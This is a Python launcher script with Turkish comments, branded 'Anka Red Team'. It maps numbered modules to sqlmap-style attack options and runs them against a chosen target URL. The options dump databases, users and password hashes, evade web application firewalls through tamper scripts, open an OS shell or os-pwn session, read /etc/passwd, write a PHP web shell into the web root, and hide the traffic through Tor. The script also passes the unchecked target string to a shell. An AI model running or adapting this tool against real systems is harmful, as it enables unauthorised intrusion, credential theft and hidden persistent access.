import os
import time

def execute_ankamap(mod_id, target_url):
    """
    Modül ID'sini alır ve ankamap.py'yi doğru parametrelerle ateşler.
    """
    # Temel dizin kontrolü ve komut başlangıcı
    base_cmd = f"python3 ankamap.py -u {target_url} --batch --random-agent"
    
    # 50 Modül için Parametre Haritası
    # Buradaki sözlük, modül numarasını SQLMAP parametresine bağlar.
    logic = {
        # K1: TEMEL TARAMA (01-10)
        "01": "--dbs", "02": "--tables", "03": "--columns", "04": "--dump", "05": "--current-db",
        "06": "--current-user", "07": "--privileges", "08": "--passwords", "09": "--users", "10": "--all",
        
        # K2: BYPASS & GÜÇ (11-20)
        "11": "--tamper=space2comment --level=3",
        "12": "--tamper=randomcase --level=5 --risk=3",
        "13": "--tamper=between,charencode --level=5",
        "14": "--tamper=apostrophemask,unionist --risk=3",
        
        # K3: SİSTEM ERİŞİM (21-30)
        "21": "--os-shell",
        "22": "--os-pwn",
        "23": "--file-read=/etc/passwd",
        "24": "--file-write=shell.php --file-dest=/var/www/html/",
        
        # K4: DERİN SIZMA (31-40)
        "31": "--forms --crawl=2",
        "37": "--identify-waf",
        
        # K5: GİZLİLİK & API (41-50)
        "41": "--tor --tor-type=SOCKS5",
        "42": "--user-agent='AnkaRedTeam-Agent'",
    }

    # Modül numarasına göre parametreyi seç (yoksa varsayılan --dbs)
    selected_param = logic.get(mod_id, "--dbs")
    full_command = f"{base_cmd} {selected_param}"

    # Ekranı temizle ve taarruza geç
    os.system('clear')
    print(f"\033[0;31m[!] ANKA RED TEAM TAARRUZ PROTOKOLÜ AKTİF\033[0m")
    print(f"\033[0;32m[+] HEDEF: {target_url}\033[0m")
    print(f"\033[0;36m[+] TETİKLENEN: {full_command}\033[0m\n")
    
    # ankamap.py'yi çalıştır
    os.system(full_command)
    
    print(f"\n\033[0;33m[!] Operasyon Tamamlandı. Menüye dönmek için ENTER...\033[0m")
    input()
